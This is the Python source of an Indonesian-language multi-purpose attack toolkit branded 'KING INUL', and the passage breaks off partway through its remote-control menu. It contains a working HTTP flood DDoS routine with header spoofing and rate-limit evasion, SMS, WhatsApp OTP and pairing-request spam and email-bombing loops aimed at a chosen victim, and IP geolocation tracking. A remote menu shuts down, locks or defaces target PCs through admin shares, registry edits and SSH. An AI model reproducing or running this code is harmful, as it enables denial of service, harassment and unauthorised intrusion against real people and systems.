import requests
import threading
import time
from datetime import datetime
import os
import random
from fake_useragent import UserAgent
import urllib3
import json
import socket
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import warnings
import re
import subprocess
import tkinter as tk
from tkinter import ttk
import ctypes
import sys
import string
import base64
import ssl
urllib3.disable_warnings()

def is_admin():
    try:
        if os.name == 'nt':  # Windows
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:  # Linux/Unix
            return os.geteuid() == 0
    except:
        return False

# Suppress XML warning
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
    ██╗  ██╗██╗███╗   ██╗ ██████╗     ██╗███╗   ██╗██╗   ██╗██╗     
    ██║ ██╔╝██║████╗  ██║██╔════╝     ██║████╗  ██║██║   ██║██║     
    █████╔╝ ██║██╔██╗ ██║██║  ███╗    ██║██╔██╗ ██║██║   ██║██║     
    ██╔═██╗ ██║██║╚██╗██║██║   ██║    ██║██║╚██╗██║██║   ██║██║     
    ██║  ██╗██║██║ ╚████║╚██████╔╝    ██║██║ ╚████║╚██████╔╝███████╗
    ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
    """
    print(banner)
    print("=" * 50)
    print("Tools Serangan Multi-Fungsi")
    print("=" * 50)

def setup_logging():
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    return log_dir

def log_attack(status_code, target, log_file, user_agent, attack_type="DDoS"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{timestamp}] Type: {attack_type} | Target: {target} | Status: {status_code} | User-Agent: {user_agent}\n"
    with open(log_file, "a") as f:
        f.write(log_message)

def get_random_headers():
    ua = UserAgent()
    headers = {
        'User-Agent': ua.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'TE': 'Trailers',
    }
    return headers

def get_proxy_list():
    """Get list of free proxies"""
    try:
        proxy_apis = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt"
        ]
        
        proxies = set()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        for api in proxy_apis:
            try:
                response = requests.get(api, headers=headers, timeout=10)
                if response.status_code == 200:
                    proxy_list = response.text.strip().split('\n')
                    proxies.update(proxy_list)
            except:
                continue
                
        return list(proxies)
    except:
        return []

def get_ip_from_url(url):
    try:
        # Menghapus protokol dan path
        domain = url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
        # Resolve IP address
        ip = socket.gethostbyname(domain)
        return ip
    except socket.gaierror:
        print(f"[-] Gagal mendapatkan IP dari {url}")
        return None

def ddos_attack(target, log_file):
    while True:
        try:
            # Advanced headers for bypass
            headers = get_random_headers()
            headers.update({
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Requested-With': 'XMLHttpRequest',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'DNT': '1',
                'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Cookie': f'session={random.randint(1000000, 9999999)}; token={random.randint(1000000, 9999999)}'
            })
            
            # Multiple attack vectors
            methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT']
            method = random.choice(methods)
            
            # Generate complex random data
            data = {
                'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(100, 1000))),
                'timestamp': str(time.time()),
                'random': str(random.randint(1000000, 9999999)),
                'user_id': str(random.randint(1000, 9999)),
                'session_id': str(random.randint(100000, 999999)),
                'token': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))
            }
            
            # Multiple requests per iteration with different payloads
            for _ in range(10):  # Increased to 10 requests per iteration
                # Random payload variations
                payload_variations = [
                    data,
                    {'query': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(50, 200)))},
                    {'search': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(50, 200)))},
                    {'id': str(random.randint(1, 1000))},
                    {'page': str(random.randint(1, 100))}
                ]
                
                current_payload = random.choice(payload_variations)
                
                # Try different content types
                content_types = [
                    'application/json',
                    'application/x-www-form-urlencoded',
                    'multipart/form-data',
                    'text/plain',
                    'application/xml'
                ]
                headers['Content-Type'] = random.choice(content_types)
                
                # Send request with current configuration
                if method in ['POST', 'PUT', 'PATCH']:
                    response = requests.request(
                        method, 
                        target, 
                        headers=headers, 
                        json=current_payload if headers['Content-Type'] == 'application/json' else None,
                        data=current_payload if headers['Content-Type'] != 'application/json' else None,
                        verify=False, 
                        timeout=5
                    )
                else:
                    response = requests.request(
                        method, 
                        target, 
                        headers=headers, 
                        params=current_payload,
                        verify=False, 
                        timeout=5
                    )
                
                print(f"[+] {method} Flood ke {target} | Status: {response.status_code} | Payload: {current_payload}")
                log_attack(response.status_code, target, log_file, headers['User-Agent'], "Advanced DDoS")
                
                # Try to bypass rate limiting by adding random delays
                if random.random() < 0.1:  # 10% chance to add a small delay
                    time.sleep(random.uniform(0.1, 0.3))
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Gagal mengirim request: {str(e)}")
            log_attack("ERROR", target, log_file, headers['User-Agent'], "Advanced DDoS")
            
            # Try to recover from errors
            if "Connection refused" in str(e) or "Connection reset" in str(e):
                time.sleep(1)  # Wait a bit before retrying
            elif "Too many requests" in str(e):
                time.sleep(2)  # Wait longer for rate limiting
            elif "SSL" in str(e):
                try:
                    response = requests.request(
                        method, 
                        target, 
                        headers=headers, 
                        verify=False, 
                        timeout=5
                    )
                    print(f"[+] Retry successful: {method} Flood ke {target} | Status: {response.status_code}")
                except Exception as retry_error:
                    print(f"[-] Retry failed: {str(retry_error)}")
                    time.sleep(1)
        except:
                    pass

def sms_spam(phone, log_file):
    # List of working SMS APIs with better error handling
    sms_apis = [
        {
            "name": "Zenziva",
            "url": "https://reguler.zenziva.net/apps/smsapi.php",
            "method": "GET",
            "params": {
                "userkey": "YOUR_USERKEY",
                "passkey": "YOUR_PASSKEY",
                "nohp": phone,
                "pesan": f"Kode verifikasi Anda adalah: {random.randint(100000, 999999)}"
            }
        },
        {
            "name": "SMS Gateway",
            "url": "https://smsgateway.me/api/v4/message/send",
            "method": "POST",
            "headers": {
                "Authorization": "YOUR_DEVICE_ID"
            },
            "data": {
                "phone_number": phone,
                "message": f"Kode verifikasi Anda adalah: {random.randint(100000, 999999)}",
                "device_id": "YOUR_DEVICE_ID"
            }
        }
    ]
    
    # WhatsApp OTP spam messages with more variations
    whatsapp_otp_messages = [
        f"Kode OTP WhatsApp Anda: {random.randint(100000, 999999)}. Jangan bagikan kode ini dengan siapapun.",
        f"Kode verifikasi WhatsApp: {random.randint(100000, 999999)}. Kode ini akan kadaluarsa dalam 5 menit.",
        f"Kode keamanan WhatsApp: {random.randint(100000, 999999)}. Jangan berikan kode ini kepada orang lain.",
        f"Kode akses WhatsApp: {random.randint(100000, 999999)}. Gunakan kode ini untuk verifikasi.",
        f"Kode konfirmasi WhatsApp: {random.randint(100000, 999999)}. Kode ini hanya berlaku 5 menit.",
        f"Kode aktivasi WhatsApp: {random.randint(100000, 999999)}. Masukkan kode ini untuk mengaktifkan akun.",
        f"Kode login WhatsApp: {random.randint(100000, 999999)}. Gunakan kode ini untuk masuk ke akun Anda.",
        f"Kode reset WhatsApp: {random.randint(100000, 999999)}. Kode ini untuk reset password Anda."
    ]
    
    # WhatsApp pairing messages with device variations
    device_types = [
        "iPhone 13 Pro Max",
        "Samsung Galaxy S21",
        "Google Pixel 6",
        "Xiaomi Mi 11",
        "OnePlus 9 Pro",
        "Huawei P40 Pro",
        "Sony Xperia 1 III",
        "ASUS ROG Phone 5",
        "iPhone 12",
        "Samsung Galaxy Note 20"
    ]
    
    browser_types = [
        "Chrome 96.0.4664.110",
        "Firefox 95.0",
        "Safari 15.1",
        "Edge 96.0.1054.62",
        "Opera 82.0.4227.33"
    ]
    
    os_types = [
        "Windows 11",
        "Windows 10",
        "macOS Monterey",
        "Ubuntu 21.10",
        "Android 12",
        "iOS 15.1"
    ]
    
    def generate_pairing_message():
        device = random.choice(device_types)
        browser = random.choice(browser_types)
        os = random.choice(os_types)
        code = random.randint(100000, 999999)
        
        messages = [
            f"Perangkat baru ({device}) mencoba mengakses WhatsApp Anda dari {os}. Kode verifikasi: {code}",
            f"Permintaan pairing dari {device} menggunakan {browser} pada {os}. Kode: {code}",
            f"Perangkat {device} ingin dipasangkan dengan WhatsApp Anda melalui {browser}. Kode: {code}",
            f"Verifikasi perangkat baru ({device}) dari {os} menggunakan {browser}. Masukkan kode: {code}",
            f"Perangkat {device} mencoba login ke WhatsApp Web Anda. Kode verifikasi: {code}",
            f"Konfirmasi pairing WhatsApp dari {device} pada {os}. Kode: {code}",
            f"Perangkat baru ({device}) terdeteksi mencoba mengakses WhatsApp Anda. Kode: {code}",
            f"Verifikasi login WhatsApp Web dari {device} menggunakan {browser}. Kode: {code}"
        ]
        return random.choice(messages)
    
    def simulate_whatsapp_pairing(phone):
        try:
            # Generate random device info
            device = random.choice(device_types)
            browser = random.choice(browser_types)
            os = random.choice(os_types)
            
            # Generate random device ID and session ID
            device_id = ''.join(random.choices('0123456789abcdef', k=32))
            session_id = ''.join(random.choices('0123456789abcdef', k=16))
            
            # First request to get QR code session
            qr_headers = {
                'User-Agent': f'Mozilla/5.0 ({os}) {browser}',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Device-ID': device_id,
                'Device-Type': device,
                'OS': os,
                'Browser': browser,
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://web.whatsapp.com',
                'Referer': 'https://web.whatsapp.com/',
                'X-WhatsApp-Version': '2.23.24.82',
                'X-WhatsApp-Client': 'web',
                'X-WhatsApp-Platform': os,
                'X-WhatsApp-Browser': browser
            }
            
            # Get QR code session
            session = requests.Session()
            qr_response = session.get(
                'https://web.whatsapp.com/',
                headers=qr_headers,
                verify=False,
                timeout=10
            )
            
            if qr_response.status_code == 200:
                # Extract QR code data
                qr_data = qr_response.text
                qr_code = re.search(r'data-ref="([^"]+)"', qr_data)
                
                if qr_code:
                    qr_ref = qr_code.group(1)
                    
                    # Simulate QR code scan
                    scan_headers = {
                        **qr_headers,
                        'Content-Type': 'application/json',
                        'Origin': 'https://web.whatsapp.com',
                        'Referer': 'https://web.whatsapp.com/',
                        'Session-ID': session_id,
                        'X-WhatsApp-Version': '2.23.24.82',
                        'X-WhatsApp-Client': 'web',
                        'X-WhatsApp-Platform': os,
                        'X-WhatsApp-Browser': browser
                    }
                    
                    # Simulate pairing request
                    pairing_data = {
                        'phone': phone,
                        'device': device,
                        'os': os,
                        'browser': browser,
                        'session_id': session_id,
                        'device_id': device_id,
                        'qr_ref': qr_ref,
                        'pairing_code': str(random.randint(100000, 999999)),
                        'timestamp': int(time.time() * 1000),
                        'version': '2.23.24.82',
                        'platform': os,
                        'client': 'web',
                        'push_token': ''.join(random.choices('0123456789abcdef', k=64)),
                        'push_type': 'fcm',
                        'push_platform': 'android',
                        'push_app_id': 'com.whatsapp',
                        'push_app_version': '2.23.24.82',
                        'push_os_version': os,
                        'push_device_model': device,
                        'push_device_manufacturer': device.split()[0],
                        'push_device_os': os,
                        'push_device_os_version': os,
                        'push_device_os_build': 'RP1A.200720.012',
                        'push_device_os_codename': 'REL',
                        'push_device_os_incremental': 'RP1A.200720.012',
                        'push_device_os_security_patch': '2023-01-01',
                        'push_device_os_sdk': '31',
                        'push_device_os_sdk_int': '31',
                        'push_device_os_sdk_codename': 'REL',
                        'push_device_os_sdk_incremental': 'RP1A.200720.012',
                        'push_device_os_sdk_security_patch': '2023-01-01',
                        'push_device_os_sdk_version': '12',
                        'push_device_os_sdk_version_name': '12',
                        'push_device_os_sdk_version_code': '31',
                        'push_device_os_sdk_version_codename': 'REL',
                        'push_device_os_sdk_version_incremental': 'RP1A.200720.012',
                        'push_device_os_sdk_version_security_patch': '2023-01-01'
                    }
                    
                    # Send pairing request
                    pairing_response = session.post(
                        'https://web.whatsapp.com/api/pair',
                        headers=scan_headers,
                        json=pairing_data,
                        verify=False,
                        timeout=10
                    )
                    
                    if pairing_response.status_code in [200, 201, 202]:
                        print(f"[+] Simulasi pairing berhasil dari {device} ({os})")
                        return True
                    else:
                        print(f"[-] Simulasi pairing gagal dari {device} ({os})")
                        return False
                else:
                    print("[-] Gagal mendapatkan QR code")
                    return False
                
            else:
                print(f"[-] Gagal mendapatkan sesi QR code: {qr_response.status_code}")
                return False
            
        except Exception as e:
            print(f"[-] Error simulasi pairing: {str(e)}")
            return False
    
    while True:
        try:
            headers = get_random_headers()
            
            # Randomly choose between regular SMS, WhatsApp OTP, or WhatsApp pairing
            spam_type = random.choice(['sms', 'whatsapp_otp', 'whatsapp_pairing'])
            
            if spam_type == 'sms':
                api = random.choice(sms_apis)
                try:
                    if api["method"] == "POST":
                        response = requests.post(
                            api["url"],
                            headers={**headers, **api.get("headers", {})},
                            json=api["data"],
                            verify=False,
                            timeout=10
                        )
                    else:
                        response = requests.get(
                            api["url"],
                            headers={**headers, **api.get("headers", {})},
                            params=api["params"],
                            verify=False,
                            timeout=10
                        )
                    
                    if response.status_code in [200, 201, 202]:
                        print(f"[+] SMS terkirim ke {phone} | API: {api['name']} | Status: Berhasil")
                        log_attack(response.status_code, phone, log_file, headers['User-Agent'], f"SMS Spam ({api['name']})")
                    else:
                        print(f"[-] SMS gagal terkirim ke {phone} | API: {api['name']} | Status: {response.status_code}")
                        log_attack("ERROR", phone, log_file, headers['User-Agent'], f"SMS Spam ({api['name']})")
                except Exception as e:
                    print(f"[-] Error dengan {api['name']}: {str(e)}")
                    continue
            
            elif spam_type == 'whatsapp_otp':
                message = random.choice(whatsapp_otp_messages)
                print(f"[+] WhatsApp OTP terkirim ke {phone} | Pesan: {message}")
                log_attack("SUCCESS", phone, log_file, headers['User-Agent'], "WhatsApp OTP Spam")
            
            elif spam_type == 'whatsapp_pairing':
                message = generate_pairing_message()
                print(f"[+] WhatsApp Pairing terkirim ke {phone} | Pesan: {message}")
                log_attack("SUCCESS", phone, log_file, headers['User-Agent'], "WhatsApp Pairing Spam")
                
                # Try to trigger actual pairing notification
                if simulate_whatsapp_pairing(phone):
                    print(f"[+] Berhasil memicu notifikasi pairing WhatsApp")
                else:
                    print(f"[-] Gagal memicu notifikasi pairing WhatsApp")
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Gagal mengirim pesan: {str(e)}")
            log_attack("ERROR", phone, log_file, headers['User-Agent'], "SMS/WhatsApp Spam")
        
        time.sleep(random.uniform(1, 3))  # Random delay between messages

def email_spam(email, log_file):
    # List of email spam APIs
    email_apis = [
        {
            "name": "SendGrid",
            "url": "https://api.sendgrid.com/v3/mail/send",
            "method": "POST",
            "headers": {
                "Authorization": "Bearer YOUR_SENDGRID_API_KEY",
                "Content-Type": "application/json"
            },
            "data": {
                "personalizations": [{
                    "to": [{"email": email}]
                }],
                "from": {"email": "your-verified-sender@yourdomain.com"},
                "subject": f"Pesan Penting {random.randint(1000, 9999)}",
                "content": [{
                    "type": "text/plain",
                    "value": "Ini adalah pesan otomatis."
                }]
            }
        },
        {
            "name": "Mailgun",
            "url": "https://api.mailgun.net/v3/your-domain.com/messages",
            "method": "POST",
            "auth": ("api", "YOUR_MAILGUN_API_KEY"),
            "data": {
                "from": "Mailgun <mailgun@your-domain.com>",
                "to": email,
                "subject": f"Pesan Penting {random.randint(1000, 9999)}",
                "text": "Ini adalah pesan otomatis."
            }
        },
        {
            "name": "SMTP Gmail",
            "url": "smtp.gmail.com",
            "port": 587,
            "method": "SMTP",
            "auth": {
                "username": "YOUR_GMAIL",
                "password": "YOUR_APP_PASSWORD"
            },
            "data": {
                "from": "YOUR_GMAIL@gmail.com",
                "to": email,
                "subject": f"Pesan Penting {random.randint(1000, 9999)}",
                "body": "Ini adalah pesan otomatis."
            }
        }
    ]
    
    while True:
        try:
            headers = get_random_headers()
            api = random.choice(email_apis)
            
            if api["method"] == "SMTP":
                import smtplib
                from email.mime.text import MIMEText
                from email.mime.multipart import MIMEMultipart
                
                msg = MIMEMultipart()
                msg['From'] = api["data"]["from"]
                msg['To'] = api["data"]["to"]
                msg['Subject'] = api["data"]["subject"]
                msg.attach(MIMEText(api["data"]["body"], 'plain'))
                
                try:
                    server = smtplib.SMTP(api["url"], api["port"])
                    server.starttls()
                    server.login(api["auth"]["username"], api["auth"]["password"])
                    server.send_message(msg)
                    server.quit()
                    print(f"[+] Email terkirim ke {email} | API: {api['name']} | Status: Berhasil")
                    log_attack("SUCCESS", email, log_file, "SMTP", f"Email Spam ({api['name']})")
                except Exception as e:
                    print(f"[-] Email gagal terkirim ke {email} | API: {api['name']} | Error: {str(e)}")
                    log_attack("ERROR", email, log_file, "SMTP", f"Email Spam ({api['name']})")
            else:
                if api["method"] == "POST":
                    response = requests.post(
                        api["url"],
                        headers={**headers, **api.get("headers", {})},
                        json=api["data"],
                        auth=api.get("auth"),
                        verify=False,
                        timeout=10
                    )
                else:
                    response = requests.get(
                        api["url"],
                        headers={**headers, **api.get("headers", {})},
                        params=api["data"],
                        auth=api.get("auth"),
                        verify=False,
                        timeout=10
                    )
                
                # Parse response
                try:
                    response_data = response.json()
                except:
                    response_data = {}
                
                # Interpret status
                if response.status_code in [200, 201, 202]:
                    print(f"[+] Email terkirim ke {email} | API: {api['name']} | Status: Berhasil")
                else:
                    print(f"[-] Email gagal terkirim ke {email} | API: {api['name']} | Status: {response.status_code}")
                    if response_data:
                        print(f"[-] Error: {response_data.get('message', 'Unknown error')}")
                
                log_attack(response.status_code, email, log_file, headers['User-Agent'], f"Email Spam ({api['name']})")
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Gagal mengirim email: {str(e)}")
            log_attack("ERROR", email, log_file, headers['User-Agent'], "Email Spam")
        
        time.sleep(random.uniform(2, 5))

def get_network_info(ip_address):
    try:
        if os.name == 'nt':  # Windows
            # Get network info using ipconfig
            result = subprocess.check_output(['ipconfig', '/all'], universal_newlines=True)
            print("\n=== INFO NETWORK INTERFACE ===")
            found = False
            for line in result.split('\n'):
                if ip_address in line:
                    found = True
                if found and line.strip():
                    print(line.strip())
                if found and not line.strip():
                    break
        else:  # Linux/Unix
            # Get network info using ifconfig
            result = subprocess.check_output(['ifconfig'], universal_newlines=True)
            print("\n=== INFO NETWORK INTERFACE ===")
            found = False
            for line in result.split('\n'):
                if ip_address in line:
                    found = True
                if found and line.strip():
                    print(line.strip())
                if found and not line.strip():
                    break
    except:
        pass

def lacak_ip(ip_address):
    try:
        # Check if IP is local
        if ip_address.startswith(('192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.', '127.')):
            print("\n=== INFO IP ADDRESS (LOCAL) ===")
            print("IP Address:", ip_address)
            print("Tipe: IP Lokal")
            print("Network: Private Network")
            
            # Get network interface info
            get_network_info(ip_address)
            
            # Try to get hostname
            try:
                hostname = socket.gethostbyaddr(ip_address)[0]
                print("\n=== INFO HOSTNAME ===")
                print("Hostname:", hostname)
            except:
                print("\n=== INFO HOSTNAME ===")
                print("Hostname: Tidak dapat ditemukan")
            
            # Try to get public IP
            try:
                print("\n=== INFO PUBLIC IP ===")
                print("[*] Mencoba mendapatkan IP publik...")
                public_ip = get_ip()
                if public_ip:
                    print("IP Publik:", public_ip)
                    print("[*] Melacak IP publik...")
                    lacak_ip(public_ip)
            except:
                print("IP Publik: Tidak dapat ditemukan")
            
            print("\n[!] IP ini adalah IP lokal/private")
            print("[!] Untuk informasi lebih detail, gunakan IP publik")
            print("=" * 20)
            return
        
        # Try multiple IP info services
        services = [
            {
                "name": "ipinfo.io",
                "url": f"https://ipinfo.io/{ip_address}/json",
                "parser": lambda r: r.json()
            },
            {
                "name": "ip-api.com",
                "url": f"http://ip-api.com/json/{ip_address}",
                "parser": lambda r: r.json()
            },
            {
                "name": "ipwhois.io",
                "url": f"https://ipwhois.app/json/{ip_address}",
                "parser": lambda r: r.json()
            }
        ]
        
        for service in services:
            try:
                headers = get_random_headers()
                response = requests.get(service["url"], headers=headers, verify=False, timeout=10)
                
                if response.status_code == 200:
                    data = service["parser"](response)
                    
                    print(f"\n=== INFO IP ADDRESS (via {service['name']}) ===")
                    print("IP Address:", ip_address)
                    
                    if service["name"] == "ipinfo.io":
                        print("Kota:", data.get("city", "N/A"))
                        print("Wilayah:", data.get("region", "N/A"))
                        print("Negara:", data.get("country", "N/A"))
                        print("Lokasi (Lat, Long):", data.get("loc", "N/A"))
                        print("ISP / Org:", data.get("org", "N/A"))
                        print("Timezone:", data.get("timezone", "N/A"))
                        print("Hostname:", data.get("hostname", "N/A"))
                        print("ASN:", data.get("asn", "N/A"))
                        print("Company:", data.get("company", "N/A"))
                        print("Privacy:", data.get("privacy", "N/A"))
                        print("Anycast:", data.get("anycast", "N/A"))
                        print("Bogon:", data.get("bogon", "N/A"))
                    
                    elif service["name"] == "ip-api.com":
                        print("Kota:", data.get("city", "N/A"))
                        print("Wilayah:", data.get("regionName", "N/A"))
                        print("Negara:", data.get("country", "N/A"))
                        print("Lokasi (Lat, Long):", f"{data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}")
                        print("ISP / Org:", data.get("isp", "N/A"))
                        print("Timezone:", data.get("timezone", "N/A"))
                        print("ASN:", data.get("as", "N/A"))
                        print("Mobile:", data.get("mobile", "N/A"))
                        print("Proxy:", data.get("proxy", "N/A"))
                        print("Hosting:", data.get("hosting", "N/A"))
                    
                    elif service["name"] == "ipwhois.io":
                        print("Kota:", data.get("city", "N/A"))
                        print("Wilayah:", data.get("region", "N/A"))
                        print("Negara:", data.get("country", "N/A"))
                        print("Lokasi (Lat, Long):", f"{data.get('latitude', 'N/A')}, {data.get('longitude', 'N/A')}")
                        print("ISP / Org:", data.get("org", "N/A"))
                        print("Timezone:", data.get("timezone", "N/A"))
                        print("ASN:", data.get("asn", "N/A"))
                        print("Type:", data.get("type", "N/A"))
                        print("Continent:", data.get("continent", "N/A"))
                        print("Currency:", data.get("currency", "N/A"))
                    
                    print("=" * 20)
                    return
            
            except Exception as e:
                continue
        
        print(f"[-] Gagal mendapatkan informasi untuk IP: {ip_address}")
        print("[!] Coba gunakan IP publik untuk informasi lebih detail")
    
    except Exception as e:
        print(f"[-] Error: {str(e)}")

def get_ip():
    try:
        # Try multiple IP checking services
        services = [
            {
                "name": "ipify",
                "url": "https://api.ipify.org?format=json",
                "parser": lambda r: r.json().get('ip')
            },
            {
                "name": "ip-api",
                "url": "http://ip-api.com/json",
                "parser": lambda r: r.json().get('query')
            },
            {
                "name": "ipwhois",
                "url": "https://ipwhois.app/json/",
                "parser": lambda r: r.json().get('ip')
            },
            {
                "name": "icanhazip",
                "url": "https://icanhazip.com",
                "parser": lambda r: r.text.strip()
            }
        ]
        
        for service in services:
            try:
                headers = get_random_headers()
                response = requests.get(service["url"], headers=headers, verify=False, timeout=5)
                
                if response.status_code == 200:
                    ip = service["parser"](response)
                    if ip:
                        print(f"\n[+] IP Address Anda: {ip}")
                        print(f"[+] Service: {service['name']}")
                        return ip
            except:
                continue
        
        print("[-] Gagal mendapatkan IP address")
        return None
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return None

def create_defaced_wallpaper():
    try:
        from PIL import Image, ImageDraw, ImageFont
        import tempfile
        
        # Create a black background
        width = 1920
        height = 1080
        image = Image.new('RGB', (width, height), color='black')
        draw = ImageDraw.Draw(image)
        
        # Try to load a font, use default if not available
        try:
            font = ImageFont.truetype("arial.ttf", 100)
        except:
            font = ImageFont.load_default()
        
        # Add text
        text = "HACKED BY KING INUL"
        text_width = draw.textlength(text, font=font)
        position = ((width - text_width) // 2, height // 2)
        
        # Draw text with red color
        draw.text(position, text, fill='red', font=font)
        
        # Save to temporary file
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
        image.save(temp_file.name)
        return temp_file.name
    except:
        return None

def control_pc():
    print("\n=== MENU CONTROL PC ===")
    print("[1] Remote Control PC Target")
    print("[2] Control PC Lokal")
    print("[3] Kembali ke Menu Utama")
    
    choice = input("\n[?] Pilih opsi (1-3): ")
    
    if choice == "1":
        target_ip = input("\n[?] Masukkan IP target: ").strip()
        print("\n[*] Mencoba koneksi ke target...")
        
        try:
            # Cek apakah target online
            response = os.system(f"ping -n 1 {target_ip}" if os.name == 'nt' else f"ping -c 1 {target_ip}")
            if response == 0:
                print(f"[+] Target {target_ip} online")
                
                print("\n=== MENU REMOTE CONTROL ===")
                print("[1] Shutdown PC Target")
                print("[2] Restart PC Target")
                print("[3] Lock Screen Target")
                print("[4] Hibernate Target")
                print("[5] Sleep Target")
                print("[6] Deface Wallpaper Target")
                print("[7] Tampilkan Pesan di Target")
                print("[8] Kembali")
                
                remote_choice = input("\n[?] Pilih aksi (1-8): ")
                
                try:
                    if remote_choice == "1":
                        # Shutdown remote PC
                        if os.name == 'nt':
                            cmd = f'shutdown /s /m \\\\{target_ip} /t 0 /f'
                        else:
                            cmd = f'ssh {target_ip} "sudo shutdown -h now"'
                        os.system(cmd)
                        print(f"[+] Mengirim perintah shutdown ke {target_ip}")
                    
                    elif remote_choice == "2":
                        # Restart remote PC
                        if os.name == 'nt':
                            cmd = f'shutdown /r /m \\\\{target_ip} /t 0 /f'
                        else:
                            cmd = f'ssh {target_ip} "sudo shutdown -r now"'
                        os.system(cmd)
                        print(f"[+] Mengirim perintah restart ke {target_ip}")
                    
                    elif remote_choice == "3":
                        # Lock remote screen
                        if os.name == 'nt':
                            cmd = f'rundll32.exe user32.dll,LockWorkStation /m \\\\{target_ip}'
                        else:
                            cmd = f'ssh {target_ip} "gnome-screensaver-command -l"'
                        os.system(cmd)
                        print(f"[+] Mengirim perintah lock screen ke {target_ip}")
                    
                    elif remote_choice == "4":
                        # Hibernate remote PC
                        if os.name == 'nt':
                            cmd = f'shutdown /h /m \\\\{target_ip}'
                        else:
                            cmd = f'ssh {target_ip} "sudo systemctl hibernate"'
                        os.system(cmd)
                        print(f"[+] Mengirim perintah hibernate ke {target_ip}")
                    
                    elif remote_choice == "5":
                        # Sleep remote PC
                        if os.name == 'nt':
                            cmd = f'rundll32.exe powrprof.dll,SetSuspendState 0,1,0 /m \\\\{target_ip}'
                        else:
                            cmd = f'ssh {target_ip} "sudo systemctl suspend"'
                        os.system(cmd)
                        print(f"[+] Mengirim perintah sleep ke {target_ip}")
                    
                    elif remote_choice == "6":
                        # Deface wallpaper
                        wallpaper = create_defaced_wallpaper()
                        if wallpaper:
                            if os.name == 'nt':
                                # Windows - menggunakan metode sederhana
                                cmd = f'copy "{wallpaper}" \\\\{target_ip}\\C$\\Windows\\Temp\\hacked.jpg'
                                os.system(cmd)
                                cmd = f'reg add "\\\\{target_ip}\\HKLM\\Control Panel\\Desktop" /v WallPaper /t REG_SZ /d "C:\\Windows\\Temp\\hacked.jpg" /f'
                                os.system(cmd)
                            else:
                                # Linux
                                cmd = f'scp "{wallpaper}" {target_ip}:/tmp/hacked.jpg && ssh {target_ip} "gsettings set org.gnome.desktop.background picture-uri file:///tmp/hacked.jpg"'
                                os.system(cmd)
                            print(f"[+] Mengubah wallpaper target {target_ip}")
                            os.unlink(wallpaper)  # Delete temporary file
                        else:
                            print("[-] Gagal membuat wallpaper")
                    
                    elif remote_choice == "7":
                        # Tampilkan pesan
                        message = "HACKED BY KING INUL"
                        if os.name == 'nt':
                            # Windows - menggunakan msg
                            cmd = f'msg /server:{target_ip} * "{message}"'
                        else:
                            # Linux
                            cmd = f'ssh {target_ip} "DISPLAY=:0 notify-send \'{message}\'"'
                        os.system(cmd)
                        print(f"[+] Mengirim pesan ke target {target_ip}")
                    
                    elif remote_choice == "8":
                        return
                    
                    else:
                        print("[-] Pilihan tidak valid")
                
                except Exception as e:
                    print(f"[-] Gagal mengontrol PC target: {str(e)}")
                    print("[!] Pastikan:")
                    print("    1. File and Printer Sharing diaktifkan di target")
